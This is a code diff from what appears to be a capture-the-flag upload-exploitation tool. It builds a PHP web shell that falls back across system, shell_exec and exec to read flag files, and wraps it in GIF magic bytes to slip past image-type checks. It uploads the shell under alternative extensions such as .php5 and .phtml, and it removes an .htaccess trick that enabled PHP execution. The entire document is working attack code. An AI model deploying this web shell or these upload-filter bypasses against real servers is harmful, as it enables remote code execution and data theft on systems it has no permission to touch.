@@ -17,10 +17,10 @@ console = Console(legacy_windows=False)
 
 _MARKER = "TWEB_RCE_PROBE"
 # Try multiple execution functions — system() is often disabled in CTF PHP configs.
-# $c is single-quoted so no PHP variable expansion; shell handles it.
+# Shell wildcards expand on the server; $c is single-quoted (no PHP variable expansion).
 _SHELL = (
     f"<?php echo '{_MARKER}';"
-    "$c='cat /flag /flag.txt /root/flag.txt /var/www/html/flag.txt /home/ctf/flag.txt 2>/dev/null';"
+    "$c='cat /flag* /root/flag* /var/www/html/flag* /home/*/flag* /tmp/flag* 2>/dev/null';"
     "if(function_exists('system')){system($c);}"
     "elseif(function_exists('shell_exec')){echo shell_exec($c);}"
     "elseif(function_exists('exec')){exec($c,$o);echo implode(chr(10),$o);}"
@@ -29,16 +29,9 @@ _SHELL = (
     "?>"
 )
 _GIF_SHELL = "GIF89a\n" + _SHELL
-# .htaccess that enables PHP execution — prepended with GIF magic bytes to pass
-# image/gif validation. Apache may parse GIF89a as an unknown directive and skip it,
-# allowing AddType to take effect; or the file simply overwrites an existing restrictive
-# .htaccess in the upload directory.
-_HTACCESS = b"GIF89a\nAddType application/x-httpd-php .php\n"
 
 # Each payload uses a unique filename — no overwrite risk between iterations.
-# .htaccess has no "tweb" prefix so the UUID replacement leaves it unchanged.
 BYPASS_PAYLOADS: list[tuple[str, str, bytes]] = [
-    (".htaccess",      "image/gif",                _HTACCESS),            # PHP exec enable
     ("tweb1.php",      "application/octet-stream", _SHELL.encode()),      # basic
     ("tweb2.php5",     "application/octet-stream", _SHELL.encode()),      # Apache alt ext
     ("tweb3.phtml",    "application/octet-stream", _SHELL.encode()),      # Apache alt ext
